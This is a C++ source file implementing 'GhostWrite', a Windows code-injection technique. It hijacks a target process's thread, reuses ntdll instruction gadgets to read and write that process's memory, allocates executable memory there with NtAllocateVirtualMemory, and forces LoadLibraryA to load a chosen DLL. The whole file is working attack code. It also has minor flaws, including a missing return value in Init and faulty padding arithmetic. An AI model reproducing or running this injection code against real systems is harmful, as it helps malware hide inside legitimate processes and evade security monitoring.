#include "injection.h"


bool GhostWrite::Init(uint32_t pid) {
	//
	// open thread
	//

	std::vector<uint32_t> threadIds = ListProcessThreads(pid);

	std::printf("Thread Ids:\n");
	for (uint32_t tid : threadIds)
		std::printf(" -> %d\n", tid);

	if (threadIds.empty())
		return false;

	if (!(thread.handle = OpenThread(THREAD_ALL_ACCESS, FALSE, threadIds[0])))
		return false;

	std::printf("opened handle to thread, handle: 0x%p\n", thread.handle);

	//
	// retreive gadgets
	//

	uint8_t* ntdll = GetLoadedModule(L"ntdll.dll");
	if (!(writeGadgetAddr = reinterpret_cast<uintptr_t>(PatternScanSect(ntdll, ".text", { 0x48, 0x89, 0x02, 0xC3 }, "xxxx"))))
		return false;

	if (!(readGadgetAddr = reinterpret_cast<uintptr_t>(PatternScanSect(ntdll, ".text", { 0x48, 0x8B, 0x00, 0xC3 }, "xxxx"))))
		return false;

	if (!(jmp0GadgetAddr = reinterpret_cast<uintptr_t>(PatternScanSect(ntdll, ".text", { 0xEB, 0xFE }, "xx"))))
		return false;

	std::printf("->write gadget: 0x%llx\n", writeGadgetAddr);
	std::printf("->read gadget: 0x%llx\n", readGadgetAddr);
	std::printf("->jmp 0 gadget: 0x%llx\n", jmp0GadgetAddr);

	// save context
	CONTEXT savedCtx = {};
	thread.Suspend();
	thread.GetContext(&savedCtx, CONTEXT_FULL);

	CONTEXT ctx = {};
	thread.GetContext(&ctx, CONTEXT_FULL);

	ctx.Rip = jmp0GadgetAddr;
	thread.SetContext(&ctx);
	WaitForAutoLock(&ctx);

	// set up return address gadget (jmp 0)
	jmp0StackAddr = ctx.Rsp - 0x1500;
	WriteQword(jmp0StackAddr, jmp0GadgetAddr);

	std::printf("->jmp 0 stack address: 0x%llx\n", jmp0StackAddr);
}

uintptr_t GhostWrite::Allocate(uint64_t size) {
	CONTEXT ctx = {};
	thread.GetContext(&ctx, CONTEXT_FULL);

	ctx.Rsp = jmp0StackAddr - 0x400;
	uintptr_t remoteMem = Push(&ctx, 0);
	uintptr_t memSize   = Push(&ctx, size);

	std::printf("triggering NtAllocateVirtualMemory\n");
	if (NT_ERROR(TriggerFunction(NtAllocateVirtualMemory, { static_cast<uintptr_t>(-1), remoteMem, 0, memSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE })))
		return false;

	remoteMem = ReadQword(remoteMem);
	std::printf("allocated memory at: 0x%llx\n", remoteMem);

	return remoteMem;
}

void GhostWrite::LoadLib(std::string name) {
	CONTEXT ctx = {};
	thread.GetContext(&ctx, CONTEXT_FULL);

	ctx.Rsp = jmp0StackAddr - 0x400;
	ctx.Rsp -= name.size() + 8;
	WriteMemory(ctx.Rsp, std::vector<uint8_t>(name.begin(), name.end()));

	std::printf("triggering LoadLibrary\n");
	TriggerFunction(LoadLibraryA, { ctx.Rsp });
}

void GhostWrite::WriteMemory(uintptr_t addr, std::vector<uint8_t> data) {
	// add padding
	if (data.size() % 8)
		data.insert(data.end(), data.size() % 8, 0x00);

	for (int i = 0; i < data.size(); i += 8) {
		WriteQword(addr + i, *reinterpret_cast<uint64_t*>(data.data() + i));
		std::printf("\rwriting memory (%d/%d)", i, static_cast<int>(data.size()));
	}
	std::fflush(stdout);
	std::printf("\n");
}

uint64_t GhostWrite::TriggerFunction(void* func, std::vector<uint64_t> args) {
	uint64_t result = 0;
	CONTEXT ctx = {};
	thread.GetContext(&ctx, CONTEXT_FULL);

	// initialize stack
	ctx.Rsp = jmp0StackAddr; // jmp 0 --> infinite loop

	//
	// initialize args
	//

	for (int i = 0; i < args.size(); i++) {
		if (i == 0) { ctx.Rcx = args[i]; std::printf("\t->Rcx: 0x%llx\n", args[i]); }
		if (i == 1) { ctx.Rdx = args[i]; std::printf("\t->Rdx: 0x%llx\n", args[i]); }
		if (i == 2) { ctx.R8 = args[i]; std::printf("\t->R8: 0x%llx\n", args[i]); }
		if (i == 3) { ctx.R9 = args[i]; std::printf("\t->R9: 0x%llx\n", args[i]); }

		if (i > 3) {
			int j = i - 3;
			int offset = j * 8 + 0x20;
			WriteQword(ctx.Rsp + offset, args[i]);
			std::printf("\tpushed arg[%d]: 0x%llx --> rsp: 0x%llx\n", i, args[i], ctx.Rsp + offset);
		}
	}

	//
	// call function
	//

	ctx.Rip = reinterpret_cast<uintptr_t>(func);
	thread.SetContext(&ctx);
	WaitForAutoLock(&ctx);

	std::printf("\ttriggered function\n");

	//
	// retrieve return value
	//

	if (thread.GetExitCode() == STILL_ACTIVE) {
		thread.Suspend();
		thread.GetContext(&ctx, CONTEXT_FULL);
		result = ctx.Rax;
		thread.Resume();
	}

	std::printf("\t->rax: 0x%llx\n", result);
	return result;
}


void GhostWrite::WaitForAutoLock(CONTEXT* ctx) {
	while (true) {
		thread.Resume();
		thread.Suspend();
		thread.GetContext(ctx, CONTEXT_FULL);

		if (ctx->Rip == jmp0GadgetAddr)
			break;

		Sleep(5);
	}
}

void GhostWrite::WriteQword(uintptr_t addr, uint64_t value) {
	CONTEXT ctx = {};
	thread.GetContext(&ctx, CONTEXT_FULL);

	// mov qword ptr [rdx], rax
	// ret
	ctx.Rdx = addr;
	ctx.Rax = value;
	ctx.Rip = writeGadgetAddr;		// IF IT CRASHES, TRY PLACING A BREAKPOINT HERE, AND THEN REMOVE IT AND CONTINUE, IDK HOW TO FIX THIS ITS WEIRD
	ctx.Rsp = jmp0StackAddr; // jmp 0 --> infinite loop

	assert(ctx.Rax == value && ctx.Rdx == addr);

	thread.SetContext(&ctx);
	WaitForAutoLock(&ctx);
}

uintptr_t GhostWrite::ReadQword(uintptr_t addr) {
	CONTEXT ctx = {};
	thread.GetContext(&ctx, CONTEXT_FULL);

	// mov rax, qword ptr [rax]
	// ret
	ctx.Rax = addr;
	ctx.Rip = readGadgetAddr;
	ctx.Rsp = jmp0StackAddr;

	assert(ctx.Rax == addr);

	thread.SetContext(&ctx);
	WaitForAutoLock(&ctx);

	return ctx.Rax;
}

uintptr_t GhostWrite::Push(CONTEXT* ctx, uint64_t value) {
	ctx->Rsp -= 8;
	WriteQword(ctx->Rsp, value);
	return ctx->Rsp;
}

void GhostWrite::Pop(CONTEXT* ctx) {
	WriteQword(ctx->Rsp, 0);
	ctx->Rsp += 8;
}